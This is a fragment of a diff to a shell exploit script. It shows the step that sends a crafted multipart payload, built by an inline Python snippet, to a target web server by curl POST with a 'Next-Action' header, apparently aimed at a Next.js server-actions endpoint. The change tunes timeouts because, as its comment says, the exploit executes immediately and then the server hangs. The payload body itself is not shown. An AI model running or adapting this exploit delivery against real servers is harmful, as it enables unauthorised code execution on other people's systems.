@@ -76,14 +76,12 @@ Content-Disposition: form-data; name=\"2\"\r
 sys.stdout.buffer.write(payload.replace('\\\\r\\\\n', '\r\n').encode())
 " > "$PAYLOAD_FILE"
 
-    # Exploit executes immediately but server hangs - run in background and don't wait
+    # Exploit executes immediately but server hangs - use short timeout
     curl -s -X POST "http://${TARGET}:${PORT}" \
         -H "Next-Action: x" \
         -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
         --data-binary @"$PAYLOAD_FILE" \
-        --connect-timeout 2 -m 3 > /dev/null 2>&1 &
-    sleep 1  # Brief pause to let payload send
-
+        --connect-timeout 2 -m 2 > /dev/null 2>&1 || true
     rm -f "$PAYLOAD_FILE" 2>/dev/null || true
 }
 
